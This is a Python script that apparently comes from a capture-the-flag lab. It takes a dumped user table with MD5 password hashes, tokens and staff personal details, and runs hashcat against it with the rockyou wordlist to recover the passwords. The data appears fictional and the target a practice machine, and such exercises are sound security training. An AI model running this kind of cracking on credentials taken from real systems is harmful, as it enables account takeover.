import json
import subprocess
import os

# 1. The Raw Data
data_str = """
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"bb1d54d5677159e040","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
"""

def run_crack():
    # Configuration
    hash_file = "monitors_hashes.txt"
    wordlist = "/usr/share/wordlists/rockyou.txt" # Standard Kali path
    hash_type = "0" # MD5

    # 2. Parse JSON and Extract Info
    try:
        users = json.loads(data_str)
        print(f"[*] Parsed {len(users)} users from JSON.")
        
        with open(hash_file, "w") as f:
            for user in users:
                # Format: username:hash
                # We use this format so we know which user owns which cracked password
                line = f"{user['username']}:{user['password']}\n"
                f.write(line)
        
        print(f"[*] Hashes saved to {hash_file} in 'username:hash' format.")

    except json.JSONDecodeError as e:
        print(f"[!] Error parsing JSON: {e}")
        return

    # 3. Check for Wordlist
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found at {wordlist}. Please check the path.")
        return

    # 4. Run Hashcat
    # -m 0: MD5
    # -a 0: Straight (Wordlist)
    # --username: Tells hashcat the input is in user:hash format
    # --show: Optional, add this if you want to see already cracked results immediately
    
    cmd = [
        "hashcat", 
        "-m", hash_type, 
        "-a", "0", 
        hash_file, 
        wordlist, 
        "--username" 
    ]

    print(f"[*] Running Hashcat command: {' '.join(cmd)}")
    print("-" * 40)

    try:
        subprocess.run(cmd)
    except FileNotFoundError:
        print("[!] Hashcat not found. Is it installed and in your PATH?")
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user.")

if __name__ == "__main__":
    run_crack()
